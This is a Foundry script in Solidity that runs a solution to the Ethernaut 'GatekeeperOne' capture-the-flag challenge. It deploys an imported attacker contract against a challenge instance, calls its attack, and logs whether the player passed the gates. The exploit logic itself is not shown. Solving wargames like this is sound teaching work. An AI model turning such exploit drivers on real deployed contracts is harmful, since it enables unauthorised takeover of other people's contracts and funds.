// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {IGatekeeperOne} from "../src/interfaces/IGatekeeperOne.sol";
import {GatekeeperOneAttack} from "../src/attackers/GatekeeperOneAttack.sol";

contract GatekeeperOneScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("INSTANCE_ADDRESS");
        address player = vm.addr(privateKey);

        IGatekeeperOne target = IGatekeeperOne(instance);

        address entrantBefore = target.entrant();

        console2.log("--- GatekeeperOne Exploit ---");
        console2.log("Target Instance:", instance);
        console2.log("Player Address :", player);
        console2.log("Entrant Before :", entrantBefore);

        if (entrantBefore == player) {
            console2.log("Player is already the entrant! Submit instance in Ethernaut.");
            return;
        }

        vm.startBroadcast(privateKey);

        GatekeeperOneAttack attackerContract = new GatekeeperOneAttack(instance);
        console2.log("Deployed GatekeeperOneAttack at:", address(attackerContract));

        attackerContract.attack();

        vm.stopBroadcast();

        address entrantAfter = target.entrant();
        console2.log("Winning Gas Offset:", attackerContract.winningGasOffset());
        console2.log("Entrant After     :", entrantAfter);

        require(entrantAfter == player, "Exploit failed: entrant not set to player");
        console2.log(">>> SUCCESS! Passed all three gates! Submit instance in Ethernaut. <<<");
    }
}
